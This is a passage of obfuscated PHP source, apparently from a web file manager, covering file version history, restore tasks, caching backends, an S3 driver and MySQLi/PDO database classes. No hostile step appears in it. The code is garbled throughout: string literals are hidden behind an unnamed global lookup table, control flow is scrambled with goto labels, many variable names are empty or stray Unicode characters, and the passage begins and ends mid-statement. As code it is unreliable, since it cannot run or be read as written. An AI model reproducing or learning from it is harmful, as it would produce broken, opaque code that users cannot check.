get_path_this($ҷ); } foreach ($Ң as $ => $ɴ) { $͚ = self::parsePath($); if (!$͚) { continue; } foreach ($ɴ as $) { $ = self::listData(rtrim($͚, $˭[8]) . $˭[8] . $, !1); if ($ && $[$˭[446]]) { $[rtrim($, $˭[8]) . $˭[8] . $] = count($[$˭[446]]); } } } return $; } public static function add($㮸) { $ =& $_SERVER[]; $ր = self::listData($㮸); if (!$ր) { return; } $ = Model($[867])->get($[955]); $ = intval($GLOBALS[$[6]][$[92]][$[1401]]); $ = $ == $[956] ? min(5, $) : $; if ($ <= 0) { return; } $ї˵ = IO::info($㮸); $ = $ր[$[446]]; if ($ї˵[$[79]] == 0) { return; } if ($ї˵[$[79]] >= 1024 * 1024 * 500) { return !1; } $٬ɚ = IO::hashSimple($㮸); if ($ && $[0][$[694]] == $٬ɚ) { return !0; } if (array_key_exists($[233], $ї˵) && !$ї˵[$[233]]) { return !1; } $ۈٜ = short_id(time()); $ǂ = array($[487] => $ۈٜ, $[694] => $٬ɚ, $[32] => $ї˵[$[32]] . $[10] . date($[1423]) . rand_string(1), $[79] => $ї˵[$[79]], $[541] => USER_ID, $[231] => time(), $[1424] => $[12]); IO::mkdir($ր[$[1425]]); $ΆŦ = IO::copy($㮸, $ր[$[1425]], !1, $ǂ[$[32]]); if (!$ΆŦ) { self::clearEmptyFolder($ր[$[1425]]); return !1; } array_unshift($, $ǂ); if (count($) > $) { $ = array_slice($, $); foreach ($ as $) { IO::remove($ր[$[1425]] . $[$[32]]); } $ = array_slice($, 0, $); } return self::saveData($ր[$[1426]], $); } public static function remove($ͫ, $ۅ) { $® =& $_SERVER[]; $ƌ = self::listData($ͫ); $ظԘ = array(); if (!$ƌ) { return !1; } foreach ($ƌ[$®[446]] as $ю) { if ($ю[$®[487]] == $ۅ) { IO::remove($ƌ[$®[1425]] . $ю[$®[32]]); continue; } $ظԘ[] = $ю; } return self::saveData($ƌ[$®[1426]], $ظԘ); } public static function clear($ϸ, $ہ = true) { $ =& $_SERVER[]; $ɮ˱ = self::listData($ϸ, $ہ); if (!$ɮ˱) { return !1; } foreach ($ɮ˱[$[446]] as $) { IO::remove($ɮ˱[$[1425]] . $[$[32]]); } return self::saveData($ɮ˱[$[1426]], array()); } public static function moveHistory($ő, $ = '', $ʘ = '') { $궀 =& $_SERVER[]; $պ = self::listData($ő, !1); if (!$պ || !$պ[$궀[446]]) { return !1; } $̆ = $궀[1415]; $ = $ ? $ : get_path_this($ő); $ʘ = $ʘ ? $ʘ : $պ[$궀[1425]]; $ = substr(get_path_this($պ[$궀[1426]]), 0, -strlen($̆)); foreach ($պ[$궀[446]] as $ك => $) { $Ѓŧ = $ . substr($[$궀[32]], strlen($)); $̊ = IO::move($պ[$궀[1425]] . $[$궀[32]], $ʘ, !1, $Ѓŧ); if ($̊) { $պ[$궀[446]][$ك][$궀[32]] = $Ѓŧ; } } $պ[$궀[1426]] = IO::move($պ[$궀[1426]], $ʘ, !1, $ . $̆); self::saveData($պ[$궀[1426]], $պ[$궀[446]]); self::clearEmptyFolder($պ[$궀[1425]]); } public static function rollback($˼, $ɭ˫) { $뾂 =& $_SERVER[]; $ӧ = self::listData($˼); if (!$ӧ) { return; } $ش = IO::info($˼); foreach ($ӧ[$뾂[446]] as $퀫 => $) { if ($[$뾂[487]] == $ɭ˫) { self::add($˼); $ڎ = $ӧ[$뾂[1425]] . $[$뾂[32]]; $ = IO::copy($ڎ, IO::pathFather($˼), REPEAT_REPLACE, $ش[$뾂[32]]); if ($) { self::remove($˼, $ɭ˫); } return $; } } return !1; } public static function setDetail($Ζ, $, $뿨) { $ =& $_SERVER[]; $ = self::listData($Ζ); if (!$) { return; } foreach ($[$[446]] as $ => $ܬ) { if ($ܬ[$[487]] == $) { $[$[446]][$][$[1424]] = $뿨; self::saveData($[$[1426]], $[$[446]]); return !0; } } return !1; } public static function fileInfo($, $Դ) { $ۗ =& $_SERVER[]; $ݚۨ = self::listData($); if (!$ݚۨ) { show_json(LNG($ۗ[105]), !1); } $ = $ۗ[12]; foreach ($ݚۨ[$ۗ[446]] as $ => $պ) { if ($պ[$ۗ[487]] != $Դ) { continue; } $ = $ݚۨ[$ۗ[1425]] . $պ[$ۗ[32]]; break; } if (!$) { show_json(LNG($ۗ[105]), !1); } return IO::info($); } public static function fileOut($ӯ, $ܪ, $ = false) { $ =& $_SERVER[]; $ = self::fileInfo($ӯ, $ܪ); $ =& $GLOBALS[$[7]]; $ = isset($[$[1379]]) && $[$[1379]] == 1; if (isset($[$[33]]) && $[$[33]] == $[1427]) { return IO::fileOutImage($[$[87]], $[$[1428]]); } IO::fileOut($[$[87]], $, get_path_this($ӯ)); } public static function listData($, $ = true) { $ =& $_SERVER[]; if ($ && !IO::exist($)) { return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } if (substr($, 0, strlen(TEMP_PATH)) == TEMP_PATH) { return !1; } $꘡ = self::pathHistory($); $ = array($[1426] => $꘡ . $[1415], $[1425] => rtrim(get_path_father($꘡), $[8]) . $[8], $[446] => array()); $β = IO::getContent($[$[1426]]); if ($β) { $ = json_decode($β, !0); if (is_array($)) { $[$[446]] = $; } } return $; } private static function saveData($, $Ҏ) { $󃛟 =& $_SERVER[]; self::log($󃛟[1429] . $ . $󃛟[74] . count($Ҏ), $󃛟[846]); if ($Ҏ) { return IO::setContent($, json_encode($Ҏ)); } $ӗ = IO::pathFather($); IO::remove($); self::clearEmptyFolder($ӗ); return !0; } public static function clearEmptyFolder($) { $ӹ =& $_SERVER[]; if (trim($, $ӹ[8]) == trim(self::$_historyBase, $ӹ[8])) { return; } $ = IO::pathFather($); $Ϝ = IO::has($, !0); if ($Ϝ[$ӹ[239]] > 0 || $Ϝ[$ӹ[240]] > 0) { return; } IO::remove($); self::clearEmptyFolder($); } private static function getBasePath() { $ =& $_SERVER[]; $ъ = Model($[1430])->get($[1431]); if ($ъ) { if (!IO::exist($ъ)) { IO::mkdir($ъ); } if (get_path_this($ъ) == $[1418]) { $ = $[1432] . rand_string(8); @rename($ъ, get_path_father($ъ) . $[8] . $); $ъ = DATA_PATH . $ . $[8]; file_put_contents(DATA_PATH . $[1367], $[12]); Model($[1430])->set($[1431], $ъ); } return $ъ; } $ъ = DATA_PATH . $[1432] . rand_string(8) . $[8]; $ъ = IO::mkdir($ъ); $ъ = rtrim($ъ, $[8]) . $[8]; file_put_contents($ъ . $[1367], $[12]); file_put_contents(DATA_PATH . $[1367], $[12]); Model($[1430])->set($[1431], $ъ); return $ъ; } } goto a; C鞑㻌: class RestoreFile { public $message; public function __construct() { } public function start($ǿ) { $į׉ =& $_SERVER[]; $֖ = Model($į׉[867]); if ($֖->get($į׉[955]) == $į׉[956]) { $this->message = LNG($į׉[957]); return !1; } $ǿ = rtrim($ǿ, $į׉[8]) . $į׉[8]; $ɇ = IO::listPath($ǿ); if (empty($ɇ[$į׉[85]]) && empty($ɇ[$į׉[86]])) { show_json(LNG($į׉[958]), !1); } $ = $į׉[959]; $ʧ = Task::get($); if ($ʧ) { if ($ʧ[$į׉[844]] == $į׉[933]) { $this->message = LNG($į׉[960]); return !0; } Task::kill($); } $것 = array($į׉[87] => $ǿ, $į׉[557] => 0, $į׉[204] => 0, $į׉[850] => array($į׉[853] => 0, $į׉[934] => 0, $į׉[858] => 0, $į׉[935] => 0, $į׉[936] => 0), $į׉[961] => array($į׉[853] => 0, $į׉[934] => 0, $į׉[936] => 0)); $ = $֖->get($į׉[937], $į׉[962]); $ = json_decode($, !0); if (!$) { $ = array(); } $ = array_merge($것, $); if (_get($GLOBALS, $į׉[963], 0) == $į׉[91] || !$[$į׉[557]]) { $ = $것; } $ = Model($į׉[560]); $̚ = array($į׉[558] => array($į׉[908], $[$į׉[557]])); $ӷ = $->field(array($į׉[943] => $į׉[944], $į׉[945] => $į׉[79]))->where($̚)->find(); if (!intval($ӷ[$į׉[944]])) { $this->message = LNG($į׉[964]); return !0; } $㷰 = intval($ӷ[$į׉[944]]); $ᚔ = intval($ӷ[$į׉[79]]); $[$į׉[850]][$į׉[853]] += $㷰; $[$į׉[850]][$į׉[858]] += $ᚔ; $[$į׉[961]][$į׉[853]] = $㷰; $[$į׉[204]] = time(); $֖->set($į׉[937], $, $į׉[962]); $ = KodIO::defaultDriver(); $ = $[$į׉[487]]; $ڍ = KodIO::makePath(KodIO::KOD_IO, $); $ʧ = new TaskFileTransfer($, $į׉[962], $㷰, LNG($į׉[965]) . $į׉[882] . LNG($į׉[912])); $ʧ->task[$į׉[858]] = $ᚔ; $Ƙ = 1000; $ҿ = 1; $܏ = $į׉[916]; $ɇ = $->where($̚)->field($܏)->order($į׉[917])->selectPage($Ƙ, $ҿ); $ = intval($ɇ[$į׉[443]][$į׉[445]]); while ($ɇ && $ҿ <= $) { $ְ = array(); foreach ($ɇ[$į׉[446]] as $Ѩ) { $[$į׉[557]] = $Ѩ[$į׉[557]]; $[$į׉[850]][$į׉[934]]++; $[$į׉[850]][$į׉[935]] += $Ѩ[$į׉[79]]; $[$į׉[961]][$į׉[934]]++; $ᐯ = $Ѩ[$į׉[87]]; if (IO::exist($ᐯ)) { $ʧ->update(1); continue; } $ = substr($ᐯ, strlen("\173\151\x6f\72{$Ѩ[$į׉[920]]}\175\x2f")); $㜥 = $ڍ . $; if ($ != $Ѩ[$į׉[920]] && IO::exist($㜥)) { $ʧ->update(1); $ְ[$Ѩ[$į׉[557]]] = $㜥; continue; } $ = $ǿ . $; if (!$this->isFileExist($)) { $ʧ->update(1); $[$į׉[850]][$į׉[936]]++; $[$į׉[961]][$į׉[936]]++; write_log($į׉[966] . $, $į׉[967]); continue; } $ͪ = get_path_father($㜥); IO::mkdir($ͪ); if (!IO::copy($, $ͪ, REPEAT_SKIP)) { $[$į׉[850]][$į׉[936]]++; $[$į׉[961]][$į׉[936]]++; write_log($į׉[968] . $ . $į׉[969] . $Ѩ[$į׉[557]], $į׉[967]); } else { $ְ[$Ѩ[$į׉[557]]] = $㜥; } $ʧ->update(1); } $this->updateFileBatch($, $ְ, $); $ҿ++; $ɇ = $->where($̚)->field($܏)->order($į׉[917])->selectPage($Ƙ, $ҿ); } $ʧ->end(); $this->updateFileBatch($, $ְ, $); $ɇ = Model($į׉[862])->listData(); $ʤ = array_to_keyvalue($ɇ, $į׉[12], $į׉[487]); $ = md5($į׉[970] . implode($į׉[50], $ʤ)); Cache::remove($); return !0; } private function isFileExist($뽫) { static $ = null; if (is_null($҇)) { $ = array(); } $ = get_path_father($뽫); if (in_array($, $)) { return !1; } if (!IO::exist($)) { $[] = $; return !1; } return IO::exist($뽫); } private function updateFileBatch($ꀞ, &$ʛ, $؝) { $Ҕ =& $_SERVER[]; Model($Ҕ[867])->set($Ҕ[937], $ꀞ, $Ҕ[962]); if (!$ʛ) { return; } $ = Model($Ҕ[560]); $Ѻ = $囂 = array(); foreach ($ʛ as $֞ => $ߝ) { $Ѻ[] = array($Ҕ[557], $֞, $Ҕ[920], $؝); $囂[] = array($Ҕ[557], $֞, $Ҕ[87], $ߝ); } $->saveAll($Ѻ); $->saveAll($囂); write_log($Ҕ[971] . count($ʛ) . $Ҕ[972] . $؝, $Ҕ[967]); $ʛ = array(); } private function updateFile($Լ, $, $, $) { $Ă =& $_SERVER[]; $嫵 = array($Ă[920] => $, $Ă[87] => $); $ = $->where(array($Ă[557] => $Լ))->save($嫵); if ($) { return; } write_log($Ă[973] . $Լ, $Ă[967]); } } class Cache { protected static $handle; protected static $memoryCache; protected static $runTimeCache; public static function init() { $÷Օ =& $_SERVER[]; if (self::$handle) { return self::$handle; } self::$memoryCache = array(); self::$runTimeCache = array(); $ = $GLOBALS[$÷Օ[6]][$÷Օ[424]]; $ꔁ = $[$[$÷Օ[974]]]; $ڊ = $[$÷Օ[975]]; switch ($[$÷Օ[974]]) { case $÷Օ[21]: self::$handle = Model($÷Օ[976]); break; case $÷Օ[977]: self::$handle = new CacheRedis($ꔁ, $ڊ); break; case $÷Օ[978]: self::$handle = new CacheMemcached($ꔁ, $ڊ); break; case $÷Օ[230]: self::$handle = new CacheFile($ꔁ, $ڊ); break; default: break; } return self::$handle; } public static function initReset() { self::$handle = !1; self::$memoryCache = !1; } public static function key($) { if (is_array($) || is_object($)) { $ = json_encode($); } $ = rawurlencode($); return md5(KOD_SITE_ID . $_SERVER[][11] . $); } public static function get($ҭܾ, $ = false) { $ۺź = self::key($ҭܾ); $щ = self::init(); if ($) { return unserialize($щ->get($ۺź)); } if (!isset(self::$memoryCache[$ۺź])) { $ = $щ->get($ۺź); self::$memoryCache[$ۺź] = unserialize($); } return self::$memoryCache[$ۺź]; } public static function set($, $, $˩ = false) { $ =& $_SERVER[]; $ҐЇ = self::key($); if (isset(self::$memoryCache[$ҐЇ]) && self::$memoryCache[$ҐЇ] === $) { return !0; } if ($˩ === 0) { self::$memoryCache[$ҐЇ] = $; return !0; } $ԧ = self::init(); $ɭ = serialize($); CacheLock::lock($ . $[979]); $эɠ = $ԧ->set($ҐЇ, $ɭ, $˩); self::$memoryCache[$ҐЇ] = $; CacheLock::unlock($ . $[979]); return $эɠ; } public static function getCall($, $鞝Ͼ, $, $՚ΰ = array()) { $ך =& $_SERVER[]; $ = self::get($); if ($ || $ === $ך[12]) { return $; } $ = call_user_func_array($, $՚ΰ); $ = $ ? $ : $ך[12]; self::set($, $, $鞝Ͼ); return $; } public static function limitCall($, $ = 15, $ɜ = 30, $黯 = true) { $ڌ̴ =& $_SERVER[]; static $ = array(); if ($黯) { $ = $ . $ڌ̴[980] . KodUser::id() . $ڌ̴[981] . get_client_ip(); } if (isset($[$]) && is_array($[$])) { return $[$][$ڌ̴[332]] <= $ɜ; } $§ = self::get($); if (!is_array($§) || time() - $§[$ڌ̴[204]] > $) { $§ = array($ڌ̴[204] => time(), $ڌ̴[332] => 0); } $§[$ڌ̴[332]]++; self::set($, $§, $); $[$] = $§; return $§[$ڌ̴[332]] <= $ɜ; } public static function limitRuntime($Ж, $ӊ) { $ּ = $_SERVER[][982] . $Ж; if (isset(self::$runTimeCache[$ּ]) || !$ӊ) { return !0; } $ = intval(self::get($ּ)); $ = !$ || $ <= 0 ? 1 : $ + 1; if ($ > $ӊ) { return !1; } self::$runTimeCache[$ּ] = !0; self::set($ּ, $, 3600); return !0; } public static function limitRuntimeClear() { if (!self::$runTimeCache) { return; } foreach (self::$runTimeCache as $ => $) { $ = intval(self::get($)); $ = !$ || $ <= 1 ? 0 : $ - 1; self::set($, $, 3600); } self::$runTimeCache = array(); } public static function remove($) { $ = self::key($); unset(self::$memoryCache[$]); self::clearTimeout(); CacheLock::lock($); $ο = self::init()->remove($); CacheLock::unlock($); return $ο; } public static function removeMemory($) { $˗ = self::key($); unset(self::$memoryCache[$˗]); } public static function clearMemory($ = false) { if ($) { $ = self::key($); unset(self::$memoryCache[$]); return; } self::$memoryCache = null; self::$memoryCache = array(); } public static function deleteAll() { self::$memoryCache = array(); if (method_exists(self::init(), $_SERVER[][983])) { self::init()->deleteAll(); } } public static function clearTimeout() { if (method_exists(self::init(), $_SERVER[][984])) { self::init()->clearTimeout(); } } } class CacheFile { public $cachePath; public $prefix; public $cacheTime; public function __construct($Ý, $塃) { $ =& $_SERVER[]; $this->cachePath = $Ý[$[87]]; $this->prefix = $[985]; $this->cacheTime = $塃; if (!file_exists($this->cachePath)) { mkdir($this->cachePath, DEFAULT_PERRMISSIONS, !0); } } public function getFile($) { $츍 =& $_SERVER[]; $ = str_replace(array($츍[986], $츍[97], $츍[76]), $츍[987], $); return $this->cachePath . $츍[988] . $ . $츍[989]; } public function set($, $׈, $ʬ = false) { $ʬ = $ʬ ? $ʬ : $this->cacheTime; $洘 = $this->getFile($); if (file_put_contents($洘, $this->prefix . $׈, LOCK_EX)) { @touch($洘, intval(time() + $ʬ)); clearstatcache(); return !0; } @unlink($洘); return !1; } public function get($) { $ = $this->getFile($); if (file_exists($) && filemtime($) < time()) { @unlink($); return !1; } $ׇ = @file_get_contents($); return substr($ׇ, strlen($this->prefix)); } public function remove($⋂) { $֗ = $this->getFile($⋂); return @unlink($֗); } public function deleteAll() { $쟜 =& $_SERVER[]; $蚱 = scandir($this->cachePath); foreach ($蚱 as $迎) { $峃 = $this->cachePath . $迎; if (strpos($峃, $쟜[989]) && strpos($峃, $쟜[990])) { @unlink($峃); } } } public function clearTimeout() { $Ñ =& $_SERVER[]; $♩ = scandir($this->cachePath); foreach ($♩ as $ޛ) { $ꁀ = $this->cachePath . $ޛ; if (strpos($ꁀ, $Ñ[989]) && strpos($ꁀ, $Ñ[990]) && filemtime($ꁀ) < time()) { @unlink($ꁀ); } } } } goto A܊; d: class PathDriverS3 extends PathDriverBaseS3 { public function __construct($) { $ =& $_SERVER[]; parent::__construct($); $ÿ = isset($[$[256]]) && $[$[256]] == $[247] ? $[247] : $[313]; $this->setSignVersion($ÿ); } public function link($ه, $Ǟ = array()) { return parent::link($ه, $Ǟ); } public function fileOut($תö, $ЀϽ = false, $Ş = false, $ = '') { if ($this->isFileOutServer() || strstr($this->endpoint, $_SERVER[][314])) { return parent::fileOutServer($תö, $ЀϽ, $Ş, $); } parent::fileOut($תö, $ЀϽ, $Ş, $); } public function fileOutImage($Ūښ, $ͯ = 250) { if (strstr($this->endpoint, $_SERVER[][314])) { return parent::fileOutImageServer($Ūښ, $ͯ); } parent::fileOutImage($Ūښ, $ͯ); } } define($_SERVER[][315], 1); define($_SERVER[][316], 2); goto Bᵒ; BۊЎ: class DbMysqli extends Db { public function __construct($ = '') { $ਨ =& $_SERVER[]; if (!extension_loaded($ਨ[1071])) { think_exception(think_lang($ਨ[14]) . $ਨ[1072]); } if (!empty($)) { $this->config = $; if (empty($this->config[$ਨ[17]])) { $this->config[$ਨ[17]] = $ਨ[12]; } } } public function connect($ȃ́ = '', $ = 0) { $ =& $_SERVER[]; if (!isset($this->linkID[$])) { if (empty($ȃ́)) { $ȃ́ = $this->config; } $this->linkID[$] = new mysqli($ȃ́[$[1042]], $ȃ́[$[1044]], $ȃ́[$[1045]], $ȃ́[$[21]], $ȃ́[$[1043]] ? intval($ȃ́[$[1043]]) : 3306); if (mysqli_connect_errno()) { think_exception(mysqli_connect_error()); } $ = $this->linkID[$]->server_version; $this->linkID[$]->query($[1046] . think_config($[1047]) . $[58]); if ($ > $[1048]) { $this->linkID[$]->query($[1049]); } $this->connected = !0; if (1 != think_config($[22])) { unset($this->config); } } return $this->linkID[$]; } public function free() { $this->queryID->free_result(); $this->queryID = null; } public function query($Э) { $ =& $_SERVER[]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $Э; if ($this->queryID) { $this->free(); } think_action_status($[23], 1); think_status($[24]); $this->queryID = $this->_linkID->query($Э); if ($this->_linkID->more_results()) { while (($ = $this->_linkID->next_result()) != NULL) { $->free_result(); } } $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = $this->queryID->num_rows; $this->numCols = $this->queryID->field_count; return $this->getAll(); } } public function execute($ʛ) { $댦 =& $_SERVER[]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $ʛ; if ($this->queryID) { $this->free(); } think_action_status($댦[25], 1); think_status($댦[24]); $ۃޭ = $this->_linkID->query($ʛ); $this->debug(); if (!1 === $ۃޭ) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->affected_rows; $this->lastInsID = $this->_linkID->insert_id; return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if ($this->transTimes == 0) { $this->_linkID->autocommit(!1); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $ = $this->_linkID->commit(); $this->_linkID->autocommit(!0); $this->transTimes = 0; if (!$) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $آț = $this->_linkID->rollback(); $this->transTimes = 0; if (!$آț) { $this->error(); return !1; } } return !0; } private function getAll() { $㈰ = array(); if ($this->numRows > 0) { for ($ա = 0; $ա < $this->numRows; $ա++) { $㈰[$ա] = $this->queryID->fetch_assoc(); } $this->queryID->data_seek(0); } return $㈰; } public function getFields($) { $ =& $_SERVER[]; $ = $this->query($[1053] . $this->parseKey($)); $ = array(); if ($) { foreach ($ as $ => $) { $[$[$[31]]] = array($[32] => $[$[31]], $[33] => $[$[34]], $[35] => (bool) ($[$[36]] === $[12]), $[37] => $[$[38]], $[39] => strtolower($[$[40]]) == $[41], $[42] => strtolower($[$[43]]) == $[44]); } } return $; } public function getTables($ӕ蒒 = '') { $ =& $_SERVER[]; $ = !empty($ӕ蒒) ? $[1055] . $ӕ蒒 . $[1056] : $[1057]; $ = $this->query($); $ۈ = array(); if ($) { foreach ($ as $ => $ʡ) { $ۈ[$] = current($ʡ); } } return $ۈ; } public function replace($Ͱ, $ = array()) { $؍ =& $_SERVER[]; foreach ($Ͱ as $ => $Β) { $ = $this->parseValue($Β); if (is_scalar($)) { $[] = $; $š[] = $this->parseKey($); } } $ = $؍[1058] . $this->parseTable($[$؍[357]]) . $؍[1059] . implode($؍[50], $š) . $؍[1060] . implode($؍[50], $) . $؍[1061]; return $this->execute($); } public function insertAll($֓, $ = array(), $ = false) { $ =& $_SERVER[]; if (!is_array($֓[0])) { return !1; } $ = array_keys($֓[0]); $ӎ = array(); foreach ($֓ as $) { $ = array(); foreach ($ as $ӌ => $ƍ) { $ƍ = $this->parseValue($ƍ); if (is_scalar($ƍ)) { $[] = $ƍ; } } $ӎ[] = $[337] . implode($[50], $) . $[1061]; } array_walk($, array($this, $[1062])); $᛺ = $ ? $[1063] : $[1064]; $᛺ = $[1064]; $ҿ = $᛺ . $[1065] . $this->parseTable($[$[357]]) . $[1059] . implode($[50], $) . $[1066] . implode($[50], $ӎ); if ($) { $ = array(); foreach ($ as $ӌ) { if ($ӌ == $[231] || $ӌ == $[1067]) { continue; } $[] = $ӌ . $[1068] . $ӌ . $[1061]; } $ҿ .= $[1069] . implode($[50], $); } return $this->execute($ҿ); } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $Ó =& $_SERVER[]; $this->error = $this->_linkID->errno . $Ó[4] . $this->_linkID->error; if ($Ó[12] != $this->queryStr) { $this->error .= LNG($Ó[48]) . $this->queryStr; } think_trace($this->error, $Ó[12], $Ó[49]); return $this->error; } public function escapeString($ǋ) { if ($this->_linkID) { return $this->_linkID->real_escape_string($ǋ); } else { return addslashes($ǋ); } } public function parseKey(&$΃, $Ϫ = true) { $Ǚ =& $_SERVER[]; if ($Ϫ) { $΃ = $this->parseKeyCheck($΃); } if ($΃ != $Ǚ[220] && !preg_match($Ǚ[1070], $΃)) { $΃ = $Ǚ[475] . trim($΃, $Ǚ[475]) . $Ǚ[475]; } return $΃; } } class DbPdo extends Db { protected $PDOStatement = null; private $table = ''; public function __construct($ՙ = '') { $؏ =& $_SERVER[]; if (!class_exists($؏[1073])) { think_exception(think_lang($؏[14]) . $؏[1074]); } if (!empty($ՙ)) { $this->config = $ՙ; if (empty($this->config[$؏[17]])) { $this->config[$؏[17]] = array(); } } } public function connect($ = '', $ݪ = 0) { $Օ =& $_SERVER[]; if (!isset($this->linkID[$ݪ])) { if (empty($)) { $ = $this->config; } $˴ = !empty($[$Օ[17]][$Օ[18]]) ? $[$Օ[17]][$Օ[18]] : $this->pconnect; if ($˴) { $[$Օ[17]][PDO::ATTR_PERSISTENT] = !0; } try { $this->linkID[$ݪ] = new PDO($[$Օ[1075]], $[$Օ[1044]], $[$Օ[1045]], $[$Օ[17]]); } catch (PDOException $َ߬) { think_exception($َ߬->getMessage()); } $this->dbType = $this->_getDsnType($[$Օ[1075]]); if (in_array($this->dbType, array($Օ[1076], $Օ[1077], $Օ[1078], $Օ[1079]))) { think_exception($Օ[1080] . $this->dbType . $Օ[1081] . $this->dbType . $Օ[1082]); } if (!$this->linkID[$ݪ]) { think_exception($Օ[1083]); } try { $this->linkID[$ݪ]->exec($Օ[1084] . think_config($Օ[1047])); } catch (Exception $َ߬) { } $this->connected = !0; if (1 != think_config($Օ[22])) { unset($this->config); } } return $this->linkID[$ݪ]; } public function free() { $this->PDOStatement = null; } public function query($۵, $댰щ = array()) { $ =& $_SERVER[]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $۵; if (!empty($댰щ)) { $this->queryStr .= $[1085] . print_r($댰щ, !0) . $[1086]; } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($[23], 1); think_status($[24]); $this->PDOStatement = $this->_linkID->prepare($۵); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $̨ = $this->PDOStatement->execute($댰щ); $this->debug(); if (!1 === $̨) { $this->error(); return !1; } else { return $this->getAll(); } } public function execute($℠, $א = array()) { $ =& $_SERVER[]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $℠; if (!empty($א)) { $this->queryStr .= $[1085] . print_r($א, !0) . $[1086]; } $܅ = !1; if ($this->dbType == $[1079]) { if (preg_match($[1087], $this->queryStr, $)) { $this->table = think_config($[1088]) . str_ireplace(think_config($[1089]), $[463], $[2]); $܅ = (bool) $this->query($[1090] . strtoupper($this->table) . $[58]); } } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($[25], 1); think_status($[24]); $this->PDOStatement = $this->_linkID->prepare($℠); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $ = $this->PDOStatement->execute($א); $this->debug(); if (!1 === $) { $this->error(); return !1; } else { $this->numRows = $this->PDOStatement->rowCount(); if ($܅ || preg_match($[1091], $℠)) { $this->lastInsID = $this->getLastInsertId(); } return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->beginTransaction(); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $̑ = $this->_linkID->commit(); $this->transTimes = 0; if (!$̑) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$) { $this->error(); return !1; } } return !0; } private function getAll() { $ = $this->PDOStatement->fetchAll(PDO::FETCH_ASSOC); $this->numRows = count($); return $; } public function getFields($) { $Ζ =& $_SERVER[]; $this->initConnect(!0); if (think_config($Ζ[1092])) { $Ｅ = str_replace($Ζ[1093], $, think_config($Ζ[1092])); } else { switch ($this->dbType) { case $Ζ[1076]: case $Ζ[1094]: $Ｅ = "\x53\105\x4c\x45\x43\124\40\x20\x20\143\x6f\154\165\x6d\156\x5f\156\x61\x6d\x65\x20\141\163\x20\x27\x4e\x61\x6d\145\47\x2c\x20\x20\x20\144\x61\x74\x61\137\164\171\x70\145\x20\x61\x73\x20\47\x54\x79\x70\145\x27\x2c\40\x20\40\143\x6f\x6c\x75\x6d\156\137\144\x65\146\x61\x75\154\x74\40\141\163\x20\47\104\145\x66\141\x75\x6c\164\47\x2c\x20\40\40\x69\x73\137\156\x75\154\154\x61\x62\154\145\40\141\x73\40\47\116\165\154\154\x27\xa\11\x9\x46\122\117\x4d\11\x69\156\x66\x6f\x72\x6d\141\164\151\157\156\x5f\163\143\x68\145\155\141\x2e\x74\x61\x62\154\x65\163\x20\101\123\40\164\xa\11\11\112\x4f\111\x4e\11\x69\x6e\146\x6f\x72\155\x61\x74\x69\157\156\x5f\163\x63\x68\x65\x6d\x61\x2e\143\157\154\165\155\156\x73\40\x41\123\40\x63\12\x9\x9\117\x4e\40\40\x74\x2e\164\141\x62\x6c\x65\137\143\141\164\141\154\157\147\40\x3d\40\143\x2e\x74\x61\142\x6c\x65\x5f\143\141\x74\x61\x6c\x6f\147\xa\11\x9\x41\116\104\40\x74\56\164\x61\x62\x6c\145\137\x73\x63\150\145\155\x61\40\x3d\x20\143\56\164\x61\142\154\145\137\163\143\x68\x65\155\x61\xa\x9\11\101\116\104\x20\x74\56\164\x61\x62\154\x65\137\x6e\x61\155\145\x20\x3d\40\x63\x2e\x74\141\x62\x6c\145\137\156\141\x6d\x65\12\11\11\x57\110\105\122\105\40\x20\40\164\56\x74\141\x62\154\145\137\x6e\141\155\x65\x20\75\40\x27{$}\x27"; break; case $Ζ[1095]: $Ｅ = $Ζ[1096] . $ . $Ζ[1097]; break; case $Ζ[1077]: case $Ζ[1079]: $Ｅ = $Ζ[1098] . $Ζ[1099] . $Ζ[1100] . strtoupper($) . $Ζ[1101] . strtoupper($) . $Ζ[1102]; break; case $Ζ[1103]: $Ｅ = $Ζ[1104] . $ . $Ζ[1105]; break; case $Ζ[1078]: break; case $Ζ[1106]: default: $Ｅ = $Ζ[1107] . ($this->dbType == $Ζ[1106] ? "\140{$}\x60" : $); } } $Ε = $this->query($Ｅ); $ = array(); if ($Ε) { foreach ($Ε as $ => $݂) { $݂ = array_change_key_case($݂); $݂[$Ζ[32]] = isset($݂[$Ζ[32]]) ? $݂[$Ζ[32]] : $Ζ[463]; $݂[$Ζ[33]] = isset($݂[$Ζ[33]]) ? $݂[$Ζ[33]] : $Ζ[463]; $ի = isset($݂[$Ζ[351]]) ? $݂[$Ζ[351]] : $݂[$Ζ[32]]; $[$ի] = array($Ζ[32] => $ի, $Ζ[33] => $݂[$Ζ[33]], $Ζ[35] => (bool) (isset($݂[$Ζ[103]]) && $݂[$Ζ[103]] === $Ζ[12] || isset($݂[$Ζ[35]]) && $݂[$Ζ[35]] === $Ζ[12]), $Ζ[37] => isset($݂[$Ζ[37]]) ? $݂[$Ζ[37]] : (isset($݂[$Ζ[56]]) ? $݂[$Ζ[56]] : $Ζ[463]), $Ζ[39] => isset($݂[$Ζ[95]]) ? strtolower($݂[$Ζ[95]]) == $Ζ[41] : (isset($݂[$Ζ[57]]) ? $݂[$Ζ[57]] : !1), $Ζ[42] => isset($݂[$Ζ[1108]]) ? strtolower($݂[$Ζ[1108]]) == $Ζ[44] : 